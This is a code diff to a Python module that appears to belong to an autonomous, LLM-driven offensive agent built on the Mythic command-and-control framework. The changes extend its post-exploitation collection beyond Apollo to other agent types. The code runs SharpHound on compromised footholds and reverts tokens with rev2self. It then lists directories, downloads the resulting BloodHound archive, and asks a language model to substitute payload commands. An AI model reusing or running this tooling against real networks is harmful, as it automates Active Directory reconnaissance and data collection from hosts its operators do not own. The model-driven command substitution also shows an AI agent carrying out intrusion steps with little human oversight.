@@ -1,5 +1,6 @@
 import copy
 import json
+import ntpath
 import os
 import re
 import asyncio
@@ -919,11 +920,17 @@ def _is_bounded_one_action_capability_request(messages: list[AnyMessage]) -> boo
         asks_for_capability = "execute_capability" in text or "capability action" in text
         asks_for_one = (
             "exactly one" in text
+            or "exactly once" in text
             or "single capability" in text
             or "one next grounded capability" in text
             or "one capability" in text
         )
-        asks_to_stop = "then stop" in text or "stop after" in text or "retry at most" in text
+        asks_to_stop = (
+            "then stop" in text
+            or "and stop" in text
+            or "stop after" in text
+            or "retry at most" in text
+        )
         return bool(asks_for_capability and asks_for_one and asks_to_stop)
     return False
 
@@ -962,7 +969,11 @@ def _terminal_execute_capability_payload(messages: list[AnyMessage]) -> dict[str
     return None
 
 
-def _terminal_execute_capability_report(payload: dict[str, Any]) -> str:
+def _terminal_execute_capability_report(
+    payload: dict[str, Any],
+    *,
+    bounded_one_action: bool = False,
+) -> str:
     capability = str(payload.get("capability") or "capability").strip()
     verdict = str(payload.get("verdict") or "unknown").strip()
     reason = str(payload.get("reason") or "").strip()
@@ -1013,7 +1024,8 @@ def _terminal_execute_capability_report(payload: dict[str, Any]) -> str:
         if len(achieved) > 10:
             preview += f", ... ({len(achieved)} total)"
         lines.append(f"Achieved effects now include: {preview}")
-    lines.append("This was a bounded one-action capability request, so Sage stopped instead of re-delegating.")
+    if bounded_one_action:
+        lines.append("This was a bounded one-action capability request, so Sage stopped instead of re-delegating.")
     return "\n".join(lines)
 
 
@@ -1697,6 +1709,7 @@ class Model:
         await self.tool_cache.initialize()
 
         self.mythic_client = MythicTools(agent_task_id=self.agent_task_id)
+        self.mythic_client.set_mechanic_repair_resolver(self._resolve_capability_mechanic)
         await self.mythic_client.login()
         try:
             await self.mythic_client._ensure_engagement_key()
@@ -1738,6 +1751,28 @@ class Model:
             .add_edge("Autonomous_Executor", "Supervisor")
             .compile(checkpointer=self.memory, name="Sage")
         )
+
+    async def _resolve_capability_mechanic(self, request: dict) -> dict | None:
+        """Propose one payload mechanic substitute for an already-fixed capability operation."""
+        if self.llm is None:
+            return None
+        try:
+            from . import mechanic_repair
+        except ImportError:
+            import mechanic_repair
+        try:
+            response = await self.llm.ainvoke([
+                SystemMessage(content=(
+                    "You are a bounded payload mechanic resolver. The capability, generic operation, artifact "
+                    "contract, and verifier are fixed. Return one JSON substitute from the supplied live command "
+                    "surface or an empty command when no substitute exists. Do not add steps or change intent."
+                )),
+                HumanMessage(content=mechanic_repair.build_prompt(request)),
+            ])
+            return mechanic_repair.parse_candidate(response)
+        except Exception as exc:
+            logger.info(f"🧭 [mechanic-repair] model resolver failed: {exc}")
+            return None
 
     def set_verbose(self, verbose: bool):
         """
@@ -2096,7 +2131,10 @@ class Model:
                 terminal_payload = _terminal_execute_capability_payload(new_messages_from_agent)
                 if terminal_payload is not None:
                     final_msg = AIMessage(
-                        content=_terminal_execute_capability_report(terminal_payload),
+                        content=_terminal_execute_capability_report(
+                            terminal_payload,
+                            bounded_one_action=True,
+                        ),
                         name="Supervisor",
                         additional_kwargs={
                             "_is_final_report": True,
@@ -2174,13 +2212,17 @@ class Model:
                                 )
                             return ""
 
-                        worker_text_parts = []
-                        for msg in substantive_messages:
-                            if isinstance(msg, AIMessage):
-                                msg_text = _message_text_content(msg).strip()
-                                if msg_text:
-                                    worker_text_parts.append(msg_text)
-                        summary_text = "\n\n".join(worker_text_parts).strip()
+                        terminal_payload = _terminal_execute_capability_payload(new_messages_from_agent)
+                        if terminal_payload is not None:
+                            summary_text = _terminal_execute_capability_report(terminal_payload)
+                        else:
+                            worker_text_parts = []
+                            for msg in substantive_messages:
+                                if isinstance(msg, AIMessage):
+                                    msg_text = _message_text_content(msg).strip()
+                                    if msg_text:
+                                        worker_text_parts.append(msg_text)
+                            summary_text = "\n\n".join(worker_text_parts).strip()
 
                         tool_contents = [
                             msg.content
@@ -2620,7 +2662,7 @@ class Model:
             return result
 
         def needs_collection(state):
-            # N2: signal collection ONLY when a SUPPORTED (Apollo) foothold actually needs it — aligned with
+            # N2: signal collection ONLY when a SUPPORTED collector-profile foothold actually needs it — aligned with
             # _controller_collection_target — so an unsupported-agent missing foothold doesn't trigger a
             # collect()->no_target slot burn. (current_access_collection_missing counts ALL agents.)
             try:
@@ -2734,9 +2776,9 @@ class Model:
         """The SPECIFIC live SUPPORTED-AGENT foothold whose CURRENT authority epoch has no verified collection.
         Aligned with `current_access_collection_missing` (scans ALL footholds, not just the first) so we don't
         re-collect an already-covered authority epoch forever while the missing one is never collected (Forge H3) — but
-        ADDITIONALLY filtered to Apollo, the only agent this deterministic collector supports. Selecting an
+        ADDITIONALLY filtered to payloads with a collector profile. Selecting an
         unsupported-agent foothold and then rejecting it would burn collection slots and starve a collectable
-        Apollo foothold (Forge N2). Returns a Foothold or None."""
+        foothold (Forge N2). Returns a Foothold or None."""
         try:
             from . import engagement_state as _es
         except ImportError:
@@ -2745,13 +2787,24 @@ class Model:
             for fh in (getattr(state, "footholds", []) or []):
                 if not _es._is_live_target_foothold(fh):
                     continue
-                if str(getattr(fh, "agent", "") or "").strip().lower() != "apollo":
+                if self._controller_collection_adapter(fh) is None:
                     continue  # N2: skip unsupported agents at SELECTION, never select-then-reject
                 if not _es.graph_collection_covers_foothold(state, fh):
                     return fh
         except Exception:
             return None
         return None
+
+    def _controller_collection_adapter(self, foothold):
+        """Return the payload's collector profile, or None when the collector has no contract for it."""
+        try:
+            from . import mythic_capability_adapter as _adapter
+        except ImportError:
+            import mythic_capability_adapter as _adapter
+        try:
+            return _adapter.collection_adapter_for_payload_type(getattr(foothold, "agent", ""))
+        except Exception:
+            return None
 
     def _controller_latest_capability_failure_is_retryable(self, state) -> bool:
         """Do not turn a repairable capability failure into an unrelated graph collection.
@@ -2800,7 +2853,7 @@ class Model:
         supported_footholds = [
             fh for fh in (getattr(state, "footholds", []) or [])
             if _es._is_live_target_foothold(fh)
-            and str(getattr(fh, "agent", "") or "").strip().casefold() == "apollo"
+            and self._controller_collection_adapter(fh) is not None
         ]
         if not supported_footholds:
             return None
@@ -2884,7 +2937,7 @@ class Model:
         return None
 
     async def _controller_collect(self, state, request=None) -> dict:
-        """Deterministic collect-once for the controller: run SharpHound (execute_assembly) -> download the ZIP
+        """Deterministic collect-once for the controller: run SharpHound -> download the ZIP
         -> ingest the FRESH artifact. Polling/waiting is deterministic (issue_task_and_waitfor_task_output), OFF
         the model path (the 'remove polling from model reasoning' P1 win). Range-agnostic: canonical SharpHound
         2.x args + canonical output path; no range literals.
@@ -2892,7 +2945,7 @@ class Model:
         FAIL-CLOSED on a failed collection: issue_task_and_waitfor_task_output returns a failure STRING without
         raising, so we never trust that SharpHound ran. SharpHound prepends a timestamp to `--ZipFilename`, so
         the on-disk name is NOT predictable — instead we give it a UNIQUE per-run token name (opsec + anchor),
-        then DISCOVER the real path via a structured `ls` of the output dir filtered to our token, and download
+        then DISCOVER the real path via the payload's `ls` output filtered to our token, and download
         THAT exact path. If no token-bearing ZIP exists, SharpHound failed -> no artifact ingested. Ingest is by
         the resolved `file_uuid` (the exact artifact), with `callback_display_id` so `_record_graph_built` flips
         the collection gate. `ok` is driven by `graph_verified` (Forge H2): only `ingested`/`already_ingested`
@@ -2931,9 +2984,12 @@ class Model:
             return result
 
         if foothold is None:
-            # No SUPPORTED (Apollo) foothold needs collection. (An unsupported-agent foothold that is missing
+            # No supported foothold needs collection. (An unsupported-agent foothold that is missing
             # collection is deliberately not selected — see _controller_collection_target / Forge N2.)
-            return outcome(False, "no_target", "no supported (Apollo) foothold needs collection")
+            return outcome(False, "no_target", "no supported foothold needs collection")
+        adapter = self._controller_collection_adapter(foothold)
+        if adapter is None:
+            return outcome(False, "no_target", "no supported foothold needs collection")
         cb = str(getattr(foothold, "callback_id", "") or "").strip()
         try:
             cb_int = int(cb.lstrip("#").removeprefix("cb"))
@@ -2941,16 +2997,28 @@ class Model:
             return outcome(False, "bad_callback", f"non-numeric callback id {cb!r}")
 
         host = str(getattr(foothold, "host", "") or "").strip()
+        forest = str(getattr(foothold, "forest", "") or "").strip()
         try:
-            context = await self.mythic_client.probe_authentication_context(cb_int, host=host)
+            context = await self.mythic_client.probe_authentication_context(
+                cb_int,
+                host=host,
+                adapter=adapter,
+                known_domain_authorities={forest} if forest else set(),
+            )
         except Exception as e:
             return outcome(False, "identity_probe_failed", f"{type(e).__name__}: {e}")
 
         if not context.domain_capable:
             fire(f"callback authentication context is local-only ({context.evidence}); restoring process context")
             try:
-                await self.mythic_client.issue_task_and_waitfor_task_output("rev2self", "", cb_int)
-                context = await self.mythic_client.probe_authentication_context(cb_int, host=host)
+                revert_command = _collection_profile_text(adapter, "collection_revert_command", "rev2self")
+                await self.mythic_client.issue_task_and_waitfor_task_output(revert_command, "", cb_int)
+                context = await self.mythic_client.probe_authentication_context(
+                    cb_int,
+                    host=host,
+                    adapter=adapter,
+                    known_domain_authorities={forest} if forest else set(),
+                )
             except Exception as e:
                 return outcome(False, "identity_restore_failed", f"{type(e).__name__}: {e}")
             if not context.domain_capable:
@@ -2971,13 +3039,20 @@ class Model:
         zip_name = f"bloodhound_{token}.zip"
         args = _mt.build_sharphound_arguments(zip_filename=zip_name, domain=scope_domain)
         out_dir = _mt.SHARPHOUND_CANONICAL_OUTPUT_DIRECTORY
+        runner_command = _collection_profile_text(adapter, "dotnet_runner_command", "execute_assembly")
+        runner_tool_param = _collection_profile_text(adapter, "dotnet_tool_param", "assembly_name")
+        runner_args_param = _collection_profile_text(adapter, "dotnet_args_param", "assembly_arguments")
+        ls_command = _collection_profile_text(adapter, "collection_ls_command", "ls")
+        ls_path_param = _collection_profile_text(adapter, "collection_ls_path_param", "path")
+        download_command = _collection_profile_text(adapter, "collection_download_command", "download")
+        download_path_param = _collection_profile_text(adapter, "collection_download_path_param", "path")
         try:
             scope_note = f" scope={scope_domain}" if scope_domain else " scope=current-forest"
             reason_note = f" reason={collection_reason}" if collection_reason else ""
-            fire(f"SharpHound execute_assembly on cb={cb_int}:{scope_note}{reason_note} {args}")
+            fire(f"SharpHound {runner_command} on cb={cb_int}:{scope_note}{reason_note} {args}")
             await self.mythic_client.issue_task_and_waitfor_task_output(
-                "execute_assembly",
-                {"assembly_name": "SharpHound.exe", "assembly_arguments": args},
+                runner_command,
+                {runner_tool_param: "SharpHound.exe", runner_args_param: args},
                 cb_int,
             )
             # DISCOVER the real on-disk path (SharpHound prepends a timestamp; never predict the name). `ls` the
@@ -2985,7 +3060,7 @@ class Model:
             real_path = ""
             for _attempt in range(4):
                 ls_out = await self.mythic_client.issue_task_and_waitfor_task_output(
-                    "ls", {"path": out_dir}, cb_int)
+                    ls_command, {ls_path_param: out_dir}, cb_int)
                 real_path = _find_token_zip_path(ls_out, token)
                 if real_path:
                     break
@@ -2996,7 +3071,7 @@ class Model:
                                "SharpHound produced no collection ZIP carrying this run's token")
             fire(f"discovered collection artifact: {real_path}")
             await self.mythic_client.issue_task_and_waitfor_task_output(
-                "download", {"path": real_path}, cb_int,
+                download_command, {download_path_param: real_path}, cb_int,
             )
             # Resolve the Mythic download by our token -> file_uuid (bounded retry; completed-download filemeta is
             # not always visible immediately).
@@ -3105,7 +3180,7 @@ class Model:
 
         terminal = _terminal_execute_capability_payload([tool_msg])
         summary_text = (
-            _terminal_execute_capability_report(terminal)
+            _terminal_execute_capability_report(terminal, bounded_one_action=True)
             if terminal is not None
             else "Autonomous executor returned a non-terminal execute_capability result."
         )
@@ -5670,12 +5745,18 @@ def _json_backtick_payload(text: str, label: str) -> Any:
         return None
 
 
+def _collection_profile_text(config: dict[str, Any], key: str, default: str) -> str:
+    if isinstance(config, dict) and key in config:
+        return str(config.get(key) or "").strip()
+    return default
+
+
 def _find_token_zip_path(ls_output: str, token: str) -> str:
-    """Find the real on-disk path of THIS collection's ZIP in an Apollo `ls` result. SharpHound prepends a
+    """Find the real on-disk path of THIS collection's ZIP in a supported `ls` result. SharpHound prepends a
     timestamp to `--ZipFilename` (e.g. `<ts>_bloodhound_<token>.zip`), so the on-disk name is NOT predictable —
-    we discover it instead. Anchored on the per-run random `token` so it cannot match any other file. Parses
-    the STRUCTURED `ls` JSON (Apollo streams one-or-more concatenated objects, each `{"files":[{name, full_name,
-    is_file}]}`), not free text, so it is robust to format/locale. Returns the file's `full_name` or ""."""
+    we discover it instead. Anchored on the per-run random `token` so it cannot match any other file. Apollo
+    streams one-or-more structured JSON objects; Merlin emits a tab-delimited native directory listing. Returns
+    the exact full path or ""."""
     dec = json.JSONDecoder()
     s = ls_output or ""
     i, n = 0, len(s)
@@ -5703,6 +5784,18 @@ def _find_token_zip_path(ls_output: str, token: str) -> str:
                 full = str(f.get("full_name") or "").strip()
                 if full:
                     return full
+    directory_match = re.search(r"(?im)^\s*Directory listing for:\s*(.+?)\s*$", s)
+    directory = directory_match.group(1).strip() if directory_match else ""
+    if not directory:
+        return ""
+    for line in s.splitlines():
+        fields = line.rstrip().split("\t")
+        if len(fields) < 4:
+            continue
+        name = fields[-1].strip()
+        lowered = name.casefold()
+        if tok in lowered and lowered.endswith(".zip"):
+            return ntpath.join(directory, name)
     return ""
 
 
